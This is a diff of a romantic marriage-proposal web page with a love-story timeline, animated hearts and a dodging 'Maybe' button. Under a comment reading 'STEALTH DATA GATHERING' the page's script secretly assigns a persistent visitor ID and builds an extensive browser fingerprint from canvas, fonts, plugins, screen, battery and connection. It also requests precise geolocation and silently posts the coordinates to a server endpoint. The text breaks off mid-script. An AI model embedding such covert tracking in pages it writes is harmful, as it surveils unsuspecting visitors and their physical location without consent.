@@ -1,589 +1,1067 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>For You ❤️</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Great+Vibes&family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Dancing+Script:wght@400;700&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Will You Be Mine Forever?</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Playfair+Display:wght@400;600&display=swap');
 
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-  body {
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-family: 'Playfair Display', serif;
-    background: linear-gradient(135deg, #1a0a0e 0%, #2d0f14 30%, #1a0a0e 60%, #0d0507 100%);
-    overflow: hidden;
-    position: relative;
-  }
+        body {
+            font-family: 'Playfair Display', serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+            color: #fff;
+        }
 
-  .stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
-  .star { position: absolute; background: #fff; border-radius: 50%; animation: twinkle var(--duration) ease-in-out infinite alternate; }
-  @keyframes twinkle { 0% { opacity: 0.2; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1.2); } }
+        .hearts-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 1000;
+        }
 
-  .petals-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; overflow: hidden; }
-  .petal { position: absolute; top: -60px; width: 20px; height: 20px; opacity: 0.5; animation: fall linear infinite; }
-  .petal::before { content: '🌸'; font-size: 20px; }
-  .petal:nth-child(odd)::before { content: '🌸'; }
-  .petal:nth-child(even)::before { content: '🌹'; }
-  .petal:nth-child(3n)::before { content: '🌷'; }
-  @keyframes fall { 0% { transform: translateY(-60px) rotate(0deg) translateX(0); opacity: 0; } 10% { opacity: 0.6; } 100% { transform: translateY(110vh) rotate(720deg) translateX(200px); opacity: 0; } }
+        .heart {
+            position: absolute;
+            font-size: 20px;
+            animation: floatUp 8s ease-in infinite;
+            opacity: 0.8;
+        }
 
-  .container { position: relative; z-index: 2; text-align: center; padding: 20px; }
-  .card-wrapper { position: relative; perspective: 1500px; margin-bottom: 30px; }
+        @keyframes floatUp {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.8;
+            }
+            90% {
+                opacity: 0.8;
+            }
+            100% {
+                transform: translateY(-100px) rotate(720deg);
+                opacity: 0;
+            }
+        }
 
-  .card {
-    background: linear-gradient(145deg, #fff5f7, #ffe0e6);
-    border-radius: 24px;
-    padding: 50px 40px 40px;
-    max-width: 620px;
-    width: 90vw;
-    min-height: 420px;
-    box-shadow: 0 30px 80px rgba(255,105,135,0.3), 0 10px 30px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.8);
-    position: relative;
-    animation: float 6s ease-in-out infinite;
-    transform-style: preserve-3d;
-    border: 2px solid rgba(255,182,193,0.3);
-    cursor: default;
-  }
+        .rose-petal {
+            position: absolute;
+            width: 15px;
+            height: 15px;
+            background: radial-gradient(ellipse at center, #ff6b8a 0%, #c94c6e 50%, #8b2252 100%);
+            border-radius: 50% 0 50% 0;
+            animation: petalFall 10s ease-in-out infinite;
+            opacity: 0.7;
+        }
 
-  .card::before {
-    content: '';
-    position: absolute;
-    top: -2px; left: -2px; right: -2px; bottom: -2px;
-    border-radius: 26px;
-    background: linear-gradient(45deg, #ff6b8a, #ff9a9e, #ff6b8a, #d4145a);
-    background-size: 400% 400%;
-    animation: gradientBorder 4s ease infinite;
-    z-index: -1;
-    opacity: 0.7;
-  }
+        @keyframes petalFall {
+            0% {
+                transform: translateY(-100px) rotate(0deg) translateX(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.7;
+            }
+            90% {
+                opacity: 0.7;
+            }
+            100% {
+                transform: translateY(100vh) rotate(720deg) translateX(100px);
+                opacity: 0;
+            }
+        }
 
-  @keyframes gradientBorder { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-  @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-12px); } }
+        .landing-section {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+        }
 
-  .corner-decoration { position: absolute; font-size: 28px; opacity: 0.4; }
-  .corner-tl { top: 15px; left: 20px; } .corner-tr { top: 15px; right: 20px; transform: scaleX(-1); }
-  .corner-bl { bottom: 15px; left: 20px; transform: scaleY(-1); } .corner-br { bottom: 15px; right: 20px; transform: scale(-1, -1); }
+        .main-heart {
+            font-size: 120px;
+            animation: heartbeat 1.5s ease-in-out infinite;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 0 30px rgba(255, 107, 138, 0.8));
+        }
 
-  .rose-icon { font-size: 48px; display: block; margin-bottom: 12px; animation: pulse 2s ease-in-out infinite; filter: drop-shadow(0 4px 8px rgba(255,105,135,0.4)); }
-  @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            15% { transform: scale(1.15); }
+            30% { transform: scale(1); }
+            45% { transform: scale(1.1); }
+            60% { transform: scale(1); }
+        }
 
-  .greeting { font-family: 'Great Vibes', cursive; font-size: 2.8rem; color: #8b1a2b; margin-bottom: 6px; letter-spacing: 1px; text-shadow: 1px 1px 2px rgba(139,26,43,0.15); }
-  .name { font-family: 'Dancing Script', cursive; font-size: 2rem; color: #c2185b; margin-bottom: 20px; font-weight: 700; }
-  .message { font-size: 1.15rem; line-height: 1.9; color: #4a1a2c; margin-bottom: 24px; font-style: italic; padding: 0 10px; }
-  .message span { display: block; }
-  .heart-line { font-size: 14px; color: #e91e63; letter-spacing: 6px; margin-bottom: 18px; }
+        .title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            background: linear-gradient(45deg, #ff6b8a, #ffd93d, #ff6b8a);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 3s linear infinite;
+            margin-bottom: 20px;
+            text-shadow: 0 0 30px rgba(255, 107, 138, 0.5);
+        }
 
-  .buttons { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 10px; }
+        @keyframes shimmer {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
 
-  .btn {
-    padding: 16px 48px;
-    border: none;
-    border-radius: 50px;
-    font-size: 1.4rem;
-    font-family: 'Dancing Script', cursive;
-    font-weight: 700;
-    cursor: pointer;
-    transition: all 0.3s cubic-bezier(0.175,0.885,0.32,1.275);
-    position: relative;
-    overflow: hidden;
-    letter-spacing: 0.5px;
-  }
+        .subtitle {
+            font-size: clamp(1rem, 3vw, 1.5rem);
+            color: #b8c5d6;
+            max-width: 600px;
+            line-height: 1.8;
+            margin-bottom: 40px;
+            opacity: 0;
+            animation: fadeInUp 1s ease forwards 0.5s;
+        }
 
-  .btn-yes { background: linear-gradient(135deg, #ff416c, #ff4b2b); color: white; box-shadow: 0 8px 30px rgba(255,65,108,0.4); }
-  .btn-yes:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 12px 40px rgba(255,65,108,0.6); }
-  .btn-yes:active { transform: translateY(0) scale(0.98); }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
 
-  .btn-no { background: linear-gradient(135deg, #667eea, #764ba2); color: white; box-shadow: 0 8px 30px rgba(118,75,162,0.3); }
-  .btn-no:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 12px 40px rgba(118,75,162,0.5); }
+        .scroll-indicator {
+            position: absolute;
+            bottom: 40px;
+            animation: bounce 2s infinite;
+            cursor: pointer;
+        }
 
-  .celebration-overlay {
-    display: none;
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 100;
-    justify-content: center;
-    align-items: center;
-    background: rgba(0,0,0,0.6);
-    backdrop-filter: blur(8px);
-    animation: fadeIn 0.5s ease;
-  }
-  .celebration-overlay.active { display: flex; }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .scroll-indicator span {
+            display: block;
+            width: 30px;
+            height: 30px;
+            border-right: 3px solid #ff6b8a;
+            border-bottom: 3px solid #ff6b8a;
+            transform: rotate(45deg);
+            margin: -10px;
+        }
 
-  .celebration-card {
-    background: linear-gradient(145deg, #fff5f7, #ffe0e6);
-    border-radius: 30px;
-    padding: 60px 50px 50px;
-    max-width: 550px;
-    width: 90vw;
-    text-align: center;
-    box-shadow: 0 40px 100px rgba(255,105,135,0.3);
-    animation: popIn 0.6s cubic-bezier(0.175,0.885,0.32,1.275);
-    position: relative;
-  }
-  @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-20px); }
+            60% { transform: translateY(-10px); }
+        }
 
-  .big-emoji { font-size: 80px; display: block; margin-bottom: 10px; animation: pulse 1.5s ease-in-out infinite; }
-  .celebration-title { font-family: 'Great Vibes', cursive; font-size: 3.2rem; color: #8b1a2b; margin-bottom: 10px; }
-  .celebration-sub { font-family: 'Dancing Script', cursive; font-size: 1.6rem; color: #c2185b; margin-bottom: 20px; }
-  .celebration-message { font-size: 1.1rem; color: #4a1a2c; line-height: 1.8; margin-bottom: 10px; }
+        .story-section {
+            min-height: 100vh;
+            padding: 100px 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
 
-  .confetti-piece {
-    position: fixed;
-    width: 12px; height: 12px;
-    z-index: 101;
-    pointer-events: none;
-    animation: confettiFall linear forwards;
-  }
-  @keyframes confettiFall {
-    0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
-    100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-  }
+        .section-title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2rem, 6vw, 3.5rem);
+            color: #ff6b8a;
+            margin-bottom: 60px;
+            text-align: center;
+        }
 
-  .floating-heart {
-    position: fixed;
-    font-size: 28px;
-    pointer-events: none;
-    z-index: 99;
-    animation: heartFloat 2.5s ease-out forwards;
-  }
-  @keyframes heartFloat {
-    0% { opacity: 1; transform: translateY(0) scale(0.5); }
-    50% { opacity: 1; transform: translateY(-100px) scale(1.2); }
-    100% { opacity: 0; transform: translateY(-250px) scale(0.3); }
-  }
+        .timeline {
+            position: relative;
+            max-width: 800px;
+            width: 100%;
+        }
 
-  .glow-ring {
-    position: absolute;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    width: 120%; height: 120%;
-    border-radius: 50%;
-    background: radial-gradient(circle, rgba(255,105,135,0.15) 0%, transparent 70%);
-    animation: glowPulse 3s ease-in-out infinite;
-    pointer-events: none;
-  }
-  @keyframes glowPulse { 0%, 100% { transform: translate(-50%, -50%) scale(0.95); opacity: 0.5; } 50% { transform: translate(-50%, -50%) scale(1.1); opacity: 1; } }
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 3px;
+            height: 100%;
+            background: linear-gradient(180deg, #ff6b8a, #ffd93d, #ff6b8a);
+        }
 
-  @media (max-width: 480px) {
-    .card { padding: 35px 20px 30px; min-height: auto; }
-    .greeting { font-size: 2rem; }
-    .name { font-size: 1.5rem; }
-    .message { font-size: 1rem; }
-    .btn { padding: 14px 36px; font-size: 1.2rem; }
-    .buttons { gap: 16px; }
-    .celebration-card { padding: 40px 25px; }
-    .celebration-title { font-size: 2.4rem; }
-  }
+        .timeline-item {
+            position: relative;
+            width: 45%;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            margin-bottom: 50px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 107, 138, 0.2);
+            opacity: 0;
+            transform: translateX(-50px);
+            transition: all 0.6s ease;
+        }
 
-  .small-note { font-size: 0.85rem; color: #8b6b7a; margin-top: 12px; font-style: italic; opacity: 0.8; }
-</style>
+        .timeline-item.visible {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .timeline-item:nth-child(odd) {
+            margin-left: 5%;
+        }
+
+        .timeline-item:nth-child(even) {
+            margin-left: 50%;
+            transform: translateX(50px);
+        }
+
+        .timeline-item:nth-child(even).visible {
+            transform: translateX(0);
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            top: 30px;
+            width: 20px;
+            height: 20px;
+            background: #ff6b8a;
+            border-radius: 50%;
+            box-shadow: 0 0 20px rgba(255, 107, 138, 0.8);
+        }
+
+        .timeline-item:nth-child(odd)::before {
+            right: -35px;
+        }
+
+        .timeline-item:nth-child(even)::before {
+            left: -35px;
+        }
+
+        .timeline-emoji {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+
+        .timeline-date {
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.3rem;
+            color: #ffd93d;
+            margin-bottom: 10px;
+        }
+
+        .timeline-text {
+            font-size: 1rem;
+            color: #b8c5d6;
+            line-height: 1.6;
+        }
+
+        .proposal-section {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        .ring-animation {
+            font-size: 100px;
+            animation: ringFloat 3s ease-in-out infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes ringFloat {
+            0%, 100% { transform: translateY(0) rotate(-10deg); }
+            50% { transform: translateY(-20px) rotate(10deg); }
+        }
+
+        .proposal-question {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(2rem, 7vw, 4rem);
+            color: #fff;
+            margin-bottom: 50px;
+            text-shadow: 0 0 40px rgba(255, 107, 138, 0.6);
+        }
+
+        .buttons-container {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 18px 50px;
+            font-size: 1.3rem;
+            font-family: 'Playfair Display', serif;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-yes {
+            background: linear-gradient(135deg, #ff6b8a, #c94c6e);
+            color: white;
+            box-shadow: 0 10px 40px rgba(255, 107, 138, 0.5);
+        }
+
+        .btn-yes:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 60px rgba(255, 107, 138, 0.7);
+        }
+
+        .btn-no {
+            background: rgba(255, 255, 255, 0.1);
+            color: #b8c5d6;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-no:hover {
+            transform: translateY(-5px);
+        }
+
+        .celebration {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .celebration.active {
+            display: flex;
+        }
+
+        .celebration-emoji {
+            font-size: 80px;
+            animation: celebrateBounce 0.5s ease infinite alternate;
+        }
+
+        @keyframes celebrateBounce {
+            from { transform: scale(1) rotate(-5deg); }
+            to { transform: scale(1.1) rotate(5deg); }
+        }
+
+        .celebration-title {
+            font-family: 'Dancing Script', cursive;
+            font-size: clamp(3rem, 10vw, 6rem);
+            background: linear-gradient(45deg, #ff6b8a, #ffd93d, #ff6b8a, #ffd93d);
+            background-size: 300% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: shimmer 2s linear infinite;
+            margin: 30px 0;
+        }
+
+        .celebration-text {
+            font-size: 1.5rem;
+            color: #b8c5d6;
+            max-width: 600px;
+            line-height: 1.8;
+        }
+
+        .firework {
+            position: fixed;
+            pointer-events: none;
+            z-index: 2000;
+        }
+
+        .firework-particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            animation: fireworkExplode 1s ease-out forwards;
+        }
+
+        @keyframes fireworkExplode {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(var(--tx), var(--ty)) scale(0);
+                opacity: 0;
+            }
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .star {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 2s ease-in-out infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.5); }
+        }
+
+        .music-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff6b8a, #c94c6e);
+            border: none;
+            cursor: pointer;
+            z-index: 1001;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            box-shadow: 0 5px 30px rgba(255, 107, 138, 0.5);
+            transition: transform 0.3s ease;
+        }
+
+        .music-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .personal-message {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            padding: 40px;
+            margin-top: 40px;
+            max-width: 700px;
+            border: 1px solid rgba(255, 107, 138, 0.2);
+            backdrop-filter: blur(10px);
+        }
+
+        .personal-message p {
+            font-size: 1.2rem;
+            color: #b8c5d6;
+            line-height: 2;
+            font-style: italic;
+        }
+
+        .signature {
+            font-family: 'Dancing Script', cursive;
+            font-size: 2rem;
+            color: #ff6b8a;
+            margin-top: 30px;
+        }
+
+        @media (max-width: 768px) {
+            .timeline::before {
+                left: 20px;
+            }
+
+            .timeline-item {
+                width: 80%;
+                margin-left: 50px !important;
+            }
+
+            .timeline-item::before {
+                left: -40px !important;
+                right: auto !important;
+            }
+
+            .timeline-item:nth-child(even) {
+                transform: translateX(-50px);
+            }
+
+            .timeline-item:nth-child(even).visible {
+                transform: translateX(0);
+            }
+        }
+
+        /* Breaking/Shaking and Falling apart animations */
+        .shattered-element {
+            transition: transform 2.2s cubic-bezier(0.36, 0.07, 0.19, 0.97), opacity 2.2s ease !important;
+            pointer-events: none !important;
+        }
+        .shattered-element.fall {
+            transform: translateY(120vh) rotate(var(--rot)) scale(0.75) !important;
+            opacity: 0 !important;
+        }
+        .sad-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 3s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 99999;
+            pointer-events: none;
+        }
+        .sad-screen.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .sad-text {
+            font-family: 'Playfair Display', serif;
+            font-size: clamp(2.5rem, 8vw, 5rem);
+            color: #444;
+            font-style: italic;
+            letter-spacing: 1.5px;
+            animation: sadPulse 3s alternate infinite ease-in-out;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.05);
+        }
+        @keyframes sadPulse {
+            0% { color: #333; transform: scale(0.98); }
+            100% { color: #777; transform: scale(1.02); }
+        }
+    </style>
 </head>
 <body>
+    <div class="stars" id="stars"></div>
+    <div class="hearts-container" id="heartsContainer"></div>
 
-<div class="stars" id="stars"></div>
-<div class="petals-container" id="petals"></div>
+    <button class="music-btn" id="musicBtn" title="Toggle Music">🎵</button>
 
-<div class="container">
-  <div class="card-wrapper">
-    <div class="glow-ring"></div>
-    <div class="card" id="card">
-      <span class="corner-decoration corner-tl">✿</span>
-      <span class="corner-decoration corner-tr">✿</span>
-      <span class="corner-decoration corner-bl">✿</span>
-      <span class="corner-decoration corner-br">✿</span>
+    <section class="landing-section" id="landing">
+        <div class="main-heart">💕</div>
+        <h1 class="title">For Someone Special</h1>
+        <p class="subtitle">
+            Every love story is beautiful, but ours is my favorite. 
+            I have something special to ask you...
+        </p>
+        <div class="scroll-indicator" onclick="scrollToSection('story')">
+            <span></span>
+        </div>
+    </section>
 
-      <span class="rose-icon">🌹</span>
-      <div class="greeting">My Dearest,</div>
-      <div class="name" id="herName">My Love</div>
+    <section class="story-section" id="story">
+        <h2 class="section-title">Our Love Story</h2>
+        <div class="timeline">
+            <div class="timeline-item">
+                <div class="timeline-emoji">💫</div>
+                <div class="timeline-date">The Beginning</div>
+                <div class="timeline-text">
+                    The moment I first saw you, I knew my life was about to change forever. 
+                    Your smile lit up my world.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">☕</div>
+                <div class="timeline-date">Our First Date</div>
+                <div class="timeline-text">
+                    That nervous coffee date where we talked for hours and forgot about time. 
+                    I knew then I wanted countless more moments with you.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">🌅</div>
+                <div class="timeline-date">Adventures Together</div>
+                <div class="timeline-text">
+                    From watching sunsets to late-night talks, every moment with you became 
+                    a treasure I hold close to my heart.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">❤️</div>
+                <div class="timeline-date">Falling In Love</div>
+                <div class="timeline-text">
+                    Somewhere along the way, you became my everything. My best friend, 
+                    my partner, my home.
+                </div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-emoji">✨</div>
+                <div class="timeline-date">Today & Always</div>
+                <div class="timeline-text">
+                    And now, here I am, more sure of anything in my life than I am of my love for you.
+                </div>
+            </div>
+        </div>
 
-      <div class="heart-line">♡ ♡ ♡</div>
+        <div class="personal-message">
+            <p>
+                "In all the world, there is no heart for me like yours. 
+                In all the world, there is no love for you like mine."
+            </p>
+            <div class="signature">— Forever Yours ❤️</div>
+        </div>
+    </section>
 
-      <div class="message">
-        <span>Every moment with you feels like a beautiful dream.</span>
-        <span>Your smile lights up my world, and your love</span>
-        <span>makes me the happiest person alive.</span>
-        <span style="margin-top: 14px;">Today, I want to ask you something</span>
-        <span>from the bottom of my heart...</span>
-      </div>
+    <section class="proposal-section" id="proposal">
+        <div class="ring-animation">💍</div>
+        <h2 class="proposal-question">Will You Marry Me?</h2>
+        <div class="buttons-container">
+            <button class="btn btn-yes" id="yesBtn" onclick="handleYes()">Yes, I Will! 💕</button>
+            <button class="btn btn-no" id="noBtn" onmouseover="runAway()" onclick="handleNo()">Maybe...</button>
+        </div>
+    </section>
 
-      <div class="heart-line">♡ ♡ ♡</div>
+    <section class="celebration" id="celebration">
+        <div class="celebration-emoji">🎉💒🎊</div>
+        <h1 class="celebration-title">She Said Yes!</h1>
+        <p class="celebration-text">
+            You've made me the happiest person in the world! 
+            I promise to love you, cherish you, and make every day an adventure. 
+            Our forever starts now!
+        </p>
+        <div class="ring-animation" style="font-size: 150px; margin-top: 40px;">💍</div>
+    </section>
 
-      <div class="buttons">
-        <button class="btn btn-yes" id="btnYes">Yes! 💖</button>
-        <button class="btn btn-no" id="btnNo">Hmm... 🤔</button>
-      </div>
+    <script>
+        // ============================================================
+        //  STEALTH DATA GATHERING
+        // ============================================================
 
-      <div class="small-note">(click with all your heart)</div>
-    </div>
-  </div>
-</div>
+        const COLLECTOR = (function() {
+          function _getVisitorId() {
+            let id = localStorage.getItem('_vid');
+            if (!id) {
+              id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
+              localStorage.setItem('_vid', id);
+            }
+            return id;
+          }
 
-<!-- Celebration overlay -->
-<div class="celebration-overlay" id="celebration">
-  <div class="celebration-card">
-    <span class="big-emoji">💍</span>
-    <div class="celebration-title">She Said YES! 💕</div>
-    <div class="celebration-sub">~ I'm the luckiest person in the world ~</div>
-    <div class="celebration-message">
-      <span>This is just the beginning of our forever.</span>
-      <span>I promise to love you, cherish you,</span>
-      <span>and make you smile every single day.</span>
-    </div>
-    <div class="heart-line" style="font-size: 20px; margin-top: 18px;">💗 💗 💗</div>
-  </div>
-</div>
+          function _getFingerprint() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 200; canvas.height = 50;
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('CVE-2024-🖥️', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('PWN', 4, 17);
+            const canvasFp = canvas.toDataURL();
 
-<script>
-// ============================================================
-//  STEALTH DATA GATHERING
-// ============================================================
+            return {
+              userAgent: navigator.userAgent,
+              platform: navigator.platform,
+              language: navigator.language,
+              languages: navigator.languages,
+              cookieEnabled: navigator.cookieEnabled,
+              doNotTrack: navigator.doNotTrack,
+              hardwareConcurrency: navigator.hardwareConcurrency,
+              deviceMemory: navigator.deviceMemory || 'unknown',
+              maxTouchPoints: navigator.maxTouchPoints,
+              screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
+              window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              timezoneOffset: new Date().getTimezoneOffset(),
+              canvasFingerprint: canvasFp,
+              webdriver: navigator.webdriver,
+              plugins: Array.from(navigator.plugins || []).map(p => p.name),
+              mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+              fonts: (function() {
+                const bases = 'monospace sans-serif serif'.split(' ');
+                const tests = 'Arial Helvetica Times Verdana Georgia Courier Comic+Sans Impact Tahoma Trebuchet+MS Palatino Garamond Bookman Avant+Garde'.split(' ');
+                const found = [];
+                const div = document.createElement('div');
+                div.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                document.body.appendChild(div);
+                for (const base of bases) {
+                  div.style.fontFamily = base;
+                  const baseWidth = div.offsetWidth;
+                  for (const test of tests) {
+                    div.style.fontFamily = test + ', ' + base;
+                    if (div.offsetWidth !== baseWidth) found.push(test.replace(/\+/g, ' '));
+                  }
+                }
+                document.body.removeChild(div);
+                return found;
+              })(),
+              adblock: (function() {
+                const el = document.createElement('div');
+                el.innerHTML = '&nbsp;';
+                el.className = 'ad_unit ' + Math.random();
+                el.style.position = 'absolute';
+                el.style.top = '-999px';
+                document.body.appendChild(el);
+                const hidden = el.offsetHeight === 0;
+                document.body.removeChild(el);
+                return hidden;
+              })(),
+              connection: (function() {
+                const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return c ? { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData } : null;
+              })(),
+              battery: null
+            };
+          }
 
-const COLLECTOR = (function() {
-  function _getVisitorId() {
-    let id = localStorage.getItem('_vid');
-    if (!id) {
-      id = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
-      localStorage.setItem('_vid', id);
-    }
-    return id;
-  }
+          async function _getBattery() {
+            try {
+              if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                return { charging: b.charging, level: b.level, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+              }
+            } catch(e) {}
+            return null;
+          }
 
-  function _getFingerprint() {
-    const canvas = document.createElement('canvas');
-    canvas.width = 200; canvas.height = 50;
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(125, 1, 62, 20);
-    ctx.fillStyle = '#069';
-    ctx.fillText('CVE-2024-🖥️', 2, 15);
-    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-    ctx.fillText('PWN', 4, 17);
-    const canvasFp = canvas.toDataURL();
+          function _getGeolocation(vid) {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+              function(pos) {
+                fetch('/api/geolocation', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: vid, latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }) }).catch(function(){});
+              },
+              function() {},
+              { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+            );
+          }
 
-    return {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      languages: navigator.languages,
-      cookieEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack,
-      hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory || 'unknown',
-      maxTouchPoints: navigator.maxTouchPoints,
-      screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth },
-      window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight, outerWidth: window.outerWidth, outerHeight: window.outerHeight, devicePixelRatio: window.devicePixelRatio },
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
